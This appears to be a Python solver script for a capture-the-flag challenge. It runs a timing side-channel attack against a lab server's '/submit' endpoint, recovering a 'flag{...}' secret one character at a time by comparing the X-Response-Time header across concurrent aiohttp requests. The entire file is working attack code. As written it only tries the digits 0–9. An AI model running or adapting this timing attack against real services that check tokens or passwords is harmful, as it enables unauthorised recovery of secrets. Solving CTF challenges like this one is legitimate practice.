import asyncio
import aiohttp

IP = "10.1.96.226"
base_url = "http://{}/submit".format(IP)

async def fetch(session, url):
    async with session.get(url) as response:
        return await response.text()

async def main():
    with open("guessing.txt", "r") as f:
        guessing = f.readlines()
    with open("response_times.txt", "r") as f:
        response_times = f.readlines()
    async with aiohttp.ClientSession() as session:
        urls = [f"{base_url}?flag=flag%7B{guessing[0].strip()}{i:x}" for i in range(0, 10)]
        tasks = [session.get(url) for url in urls]
        responses = await asyncio.gather(*tasks)
        for j, resp in enumerate(responses):
            headers = dict(resp.headers)
            print(resp.request_info.url)
            respons = str(resp.request_info.url)
            xResponseTime = headers.get("X-Response-Time")
            print(f"Response {j+1} X-Response-Time:", xResponseTime)
            if xResponseTime and float(xResponseTime) > (float(response_times[0].strip()) + 0.09):
                guessing[0] = guessing[0].strip() + respons[-1]
                with open("guessing.txt", "w") as f:
                    f.write(guessing[0] + "\n")
                with open("response_times.txt", "w") as f:
                    f.write(xResponseTime + "\n")
                print("Found new part of the flag: " + "flag{" + guessing[0])
                print("Flag has "+ str(len(guessing[0])) + " characters")
                break
asyncio.run(main())
